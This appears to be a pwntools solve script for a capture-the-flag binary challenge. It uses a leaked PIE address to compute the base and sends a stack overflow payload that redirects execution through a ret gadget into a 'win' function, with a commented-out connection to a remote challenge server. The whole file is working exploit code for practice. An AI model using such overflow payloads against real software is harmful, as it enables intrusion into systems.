from pwn import *

p = process("./welcome")
# p = remote("45.77.44.53", 1024)
binary = ELF("welcome")
win = binary.symbols['win']
ret = 0x000000000000070e

p.recvuntil("welcome(): ")
pie_leak = int(p.recvline()[:-1], 16)
log.info("Pie Leak: {}".format(hex(pie_leak)))
pie_base = pie_leak - 0x942
log.info("Pie base: {}".format(hex(pie_base)))

payload = ''
payload += 'ARA2021\x00'
payload += 'A' * 0x100
# payload += 'B' * 8
payload += p64(pie_base + ret)
payload += p64(pie_base + win)

# gdb.attach(p, 'b *vuln+94')
#0x000056551ce68000
#0x000056037d1a2000

p.sendline(payload)
p.interactive()